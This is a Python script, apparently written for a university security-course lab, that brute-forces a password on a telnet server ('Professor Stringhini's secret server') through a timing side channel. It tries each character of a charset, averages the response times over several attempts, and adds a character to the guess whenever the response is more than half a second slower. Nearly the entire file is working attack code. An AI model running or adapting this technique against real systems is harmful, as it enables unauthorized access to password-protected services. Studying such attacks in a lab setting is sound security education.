import telnetlib
import time
import socket

# Configuration for secret server
HOST = "ec521network"
PORT = 1234

# Define charset
CHARSET = " !#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~"

def mean(numbers):
    return sum(numbers) / len(numbers) if numbers else 0

def try_password(prefix, num_tries=3):
    max_retries = 3
    retry_delay = 1  # seconds
    response_times = []
    
    print("Attempting password: {} ({} tries)".format(prefix, num_tries))  # Debug output
    
    for _ in range(num_tries):
        for attempt in range(max_retries):
            try:
                time.sleep(0.5)
                tn = telnetlib.Telnet(HOST, PORT, timeout=15)
                start_time = time.time()
                tn.write((prefix + "\n").encode('ascii'))
                response = tn.read_until(b"\n", timeout=15)
                response_time = time.time() - start_time
                print("Raw response time: {:.3f} seconds".format(response_time))  # Debug output
                response_times.append(response_time)
                tn.close()
                break
            except socket.error:
                if attempt < max_retries - 1:
                    print("Connection refused, retrying in {} seconds...".format(retry_delay))
                    time.sleep(retry_delay)
                else:
                    print("Connection refused to {}:{} after {} attempts.".format(HOST, PORT, max_retries))
                    return None
            except Exception as e:
                print("An error occurred: {}".format(e))
                if attempt < max_retries - 1:
                    time.sleep(retry_delay)
                else:
                    return None

    avg_time = mean(response_times) if response_times else None
    if avg_time is not None:
        print("Average response time: {:.3f} seconds".format(avg_time))  # Debug output
        print("Individual times: {}".format(
            ", ".join("{:.3f}".format(t) for t in response_times)
        ))  # Debug output
    return avg_time

def discover_password():
    password = ""  # Initialize password
    consecutive_failures = 0
    max_consecutive_failures = 5
    previous_response_time = try_password(password, num_tries=5)
    
    print("Initial response time: {:.3f}".format(previous_response_time))  # Debug output

    while True:
        response_times = {}
        valid_response_received = False

        for char in CHARSET:
            attempt = password + char
            print("Trying password: {}".format(attempt))

            response_time = try_password(attempt, num_tries=5)
            if response_time is not None:
                valid_response_received = True
                response_times[char] = response_time
                print("Average response time for '{}': {:.3f} seconds".format(char, response_time))
                
                time_difference = response_time - previous_response_time
                print("Time difference: {:.3f} seconds".format(time_difference))  # Debug output

                if time_difference > 0.5:
                    password += char
                    print("Significant increase in response time detected. Adding '{}' to password.".format(char))
                    previous_response_time = response_time
                    break

        if not valid_response_received:
            consecutive_failures += 1
            if consecutive_failures >= max_consecutive_failures:
                print("Too many connection failures, stopping.")
                break
            time.sleep(5)
            continue
        else:
            consecutive_failures = 0

        if len(password) > 50:
            print("Password is too long, stopping.")
            break

    return password

if __name__ == "__main__":
    print("Starting improved password discovery process for Professor Stringhini's secret server...")
    print("Connecting to {}:{}".format(HOST, PORT))
    print("Using character set of {} characters".format(len(CHARSET)))
    print("-" * 50)
    
    final_password = discover_password()
    if final_password:
        print("\nFinal Discovered Password: {}".format(final_password))
    else:
        print("\nPassword discovery failed.")